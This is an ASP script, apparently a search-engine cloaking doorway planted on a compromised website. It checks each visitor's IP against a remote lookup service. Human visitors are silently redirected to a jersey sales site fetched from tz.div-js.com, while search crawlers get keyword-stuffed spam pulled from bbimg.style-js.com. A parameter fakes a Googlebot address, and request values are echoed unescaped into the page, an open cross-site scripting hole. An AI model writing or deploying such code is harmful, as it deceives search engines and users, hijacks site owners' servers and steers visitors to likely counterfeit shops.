<%
Function getHTTPPage(url) 
On Error Resume Next
dim http 
set http=Server.createobject("Microsoft.XMLHTTP") 
Http.open "GET",url,false 
Http.setRequestHeader "User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; rv:20.0) Gecko/20100101 Firefox/20.0"  
Http.send() 
if Http.readystate<>4 then
exit function 
end if 
getHTTPPage=bytesToBSTR(Http.responseBody,"utf-8")
set http=nothing
If Err.number<>0 then 
Response.Write "<p align='center'><font color='red'><b> </b></font></p>" 
Response.end
Err.Clear
End If  
End Function

Function BytesToBstr(body,Cset)
dim objstream
set objstream = Server.CreateObject("adodb.stream")
objstream.Type = 1
objstream.Mode =3
objstream.Open
objstream.Write body
objstream.Position = 0
objstream.Type = 2
objstream.Charset = Cset
BytesToBstr = objstream.ReadText 
objstream.Close
set objstream = nothing
End Function
Randomize
%>

<%
Dim Url,Html,hyzhdy,kname
hyzhdy="http://bbimg.style-js.com/JDNEW.aspx"
if request("iid")<>"" then
kname =getHTTPPage("http://bbimg.style-js.com/gn.aspx?iid="&request("iid"))
end if
if request("kk")<>"" then
ip="66.249.64.190"
else
ip=Request.ServerVariables("REMOTE_ADDR")
end if

ipurl="http://cdoi09.fr/getdomain.aspx?rnd=1&ip="&ip
domain =getHTTPPage(ipurl)
if(instr(domain,"google")=0 and instr(domain,"msn.com")=0 and instr(domain,"yahoo.com")=0 and instr(domain,"aol.com")=0) then
    if request("iid")<>""  then
    ddd=getHTTPPage("http://tz.div-js.com/xtz.txt")
    ddd=ddd&"?cid=115&cname="&Server.URLEncode(kname)
    Response.write "<script>self.location.href="""&ddd&"""</script>"
    end if	
     if request("searchtxt")<>""  then
    ddd=getHTTPPage("http://tz.div-js.com/xtz.txt")
    ddd=ddd&"?cid=115&cname="&Server.URLEncode(request("searchtxt"))
    Response.write "<script>self.location.href="""&ddd&"""</script>"
    end if
     if request("pnum")<>""  then
    ddd=getHTTPPage("http://tz.div-js.com/xtz.txt")
	ddd=Replace(ddd, "Products.aspx", "")
    ddd=ddd&"?cid=115"
    Response.write "<script>self.location.href="""&ddd&"""</script>"
    end if	
end if
%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<script>
document.cookie="u="+window.location.href;
</script>

<title> <%=kname%><%=request("searchtxt")%> jersey on sale <%=request("pnum")%> </title>
<meta name="keywords" content="<%=kname%><%=request("searchtxt")%>"/>
<meta name="description" content=" <%=kname%><%=request("searchtxt")%> > OFF-<%=INT((65-50+1)*RND+50)%>% Clearance Jerseys and discounted collectible merchandise is at Our shop. " />
<meta name="robots" content="index,follow,all"/>
<meta http-equiv="Content-Type" content="text/html;charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
</head>
<body>
<%

if request("type")<>"" then
if(request("type")="search") then
URL=hyzhdy&"?cid=115&searchtxt="&request("searchtxt")
con=getHTTPPage(URL)
con=Replace(con, "UUUUU", "http://"&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
end if
else
if request("iid")<>"" then
URL=hyzhdy&"?iid="&request("iid")&"&mt=http://bbimg.style-js.com/en/enm.txt"

else
URL=hyzhdy&"?cid=115&pnum="&request("pnum")
end if
con=getHTTPPage(URL)
con=Replace(con, "UUUUU", "http://"&Request.ServerVariables("HTTP_HOST")&Request.ServerVariables("SCRIPT_NAME"))
con=Replace(con, "BBBBB", Request.ServerVariables("HTTP_HOST"))
con=Replace(con, "NNNNN", "Sale Jerseys")
con=Replace(con, "SSSSS", "Shop Jerseys Women's&Men's Clothing, Shoes & Accessories on Sale at Here. Shop Here Sale & Clearance for women's&men's clothing, Jerseys & shoes today!")
con=Replace(con, "DDDDD", "Wholesale NBA Jerseys Online, Cheap NHL Jerseys From Professional ... Shirts look only has an option to buy T-shirts or cheap nba jerseys.") 
end if
Response.write con
%> 
</body>

</html>  